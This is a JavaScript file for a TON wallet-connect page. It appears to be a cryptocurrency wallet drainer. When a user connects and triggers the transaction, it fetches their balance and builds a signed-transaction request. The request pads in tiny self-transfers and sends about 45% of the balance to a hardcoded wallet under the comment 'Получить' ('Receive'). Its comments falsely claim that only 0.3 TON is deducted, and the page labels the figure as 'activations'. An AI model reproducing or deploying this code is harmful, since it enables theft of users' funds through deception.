var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X"; //  Основной кошелек для перевода 

// Создаем объект для подключения к TonConnect UI
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/time/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

// Храним адрес подключенного кошелька
let walletAddress = null;

// Обработчик изменения статуса подключения
tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('Адрес подключенного кошелька:', walletAddress);
        
        // Когда кошелек подключен, обновляем баланс
        await updateBalance(walletAddress);
    }
});

// Функция для обновления баланса на странице
async function updateBalance(walletAddress) {
    try {
        // Получаем баланс кошелька
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();

        if (!data.balance) {
            console.error('Не удалось получить баланс');
            alert('Не удалось получить баланс');
            return;
        }

        const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
        const deduction = originalBalance * 0.55; // 0.3 TON в нанотонах

        // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
        if (originalBalance <= deduction) {
            console.error('Баланс слишком мал для вычитания 0.3 TON');
            alert('Баланс слишком мал для вычитания 0.3 TON');
            return;
        }

        // Вычитаем 0.3 TON из баланса
        const remainingBalance = originalBalance - deduction;

        // Конвертация в TON
        const displayedBalance = remainingBalance / 1000000000;
        console.log(`Баланс после вычета 0.3 TON: ${displayedBalance} TON`);

        // Обновляем отображение баланса на странице
        const walletInfoElement = document.getElementById('wallet-info');
        if (walletInfoElement) {
            walletInfoElement.innerHTML = `Remaining amount of activations: <b>${displayedBalance} TON</b>`;
        }

    } catch (error) {
        console.error('Ошибка при получении баланса:', error);
    }
}

// Функция для отправки транзакции
async function didtrans() {
    // Проверяем, подключен ли кошелек
    if (!walletAddress) {
        console.error('Кошелек не подключен');
        alert('Кошелек не подключен');
        return;
    }

    // Получаем баланс кошелька
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();

    // Проверка на ошибки при получении данных о кошельке
    if (!data.balance) {
        console.error('Не удалось получить баланс');
        return;
    }

    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
    const origbal = originalBalance * 0.55;
    const roundedBalance = Math.round(origbal);

    // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
    const deduction = roundedBalance; // 0.3 TON в нанотонах

    // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
    if (originalBalance <= deduction) {
        console.error('Баланс слишком мал для вычитания 0.3 TON');
        return;
    }

    // Вычитаем 0.3 TON из баланса
    const remainingBalance = originalBalance - deduction;

    console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);

    // Формируем транзакцию с двумя сообщениями
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
        messages: [
            {
                address: walletAddress,  // Адрес получателя для первой части
                amount: 100,       // Сумма для первой транзакции (0.001 TON)
            },
            {
                address: walletAddress,  // Адрес получателя для первой части
                amount: 100,       // Сумма для первой транзакции (0.001 TON)
            },
            {
                address: walletAddress,  // Адрес получателя для первой части
                amount: 100,       // Сумма для первой транзакции (0.001 TON)
            },
            {
                address: mainWallet,   // Адрес получателя для второй части
                amount: remainingBalance, // Сумма для второй транзакции
            }
        ],
        sendMode: 5,  // Если это требуется в вашем API
        comment: "Получить",  // Комментарий (по желанию)
    };

    try {
        // Подписание и отправка транзакции через TonConnect
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция успешно отправлена:', result);
        
        // Обновляем баланс после отправки
        await updateBalance(walletAddress);
    } catch (error) {
        console.error('Ошибка при отправке транзакции:', error);
    }
}
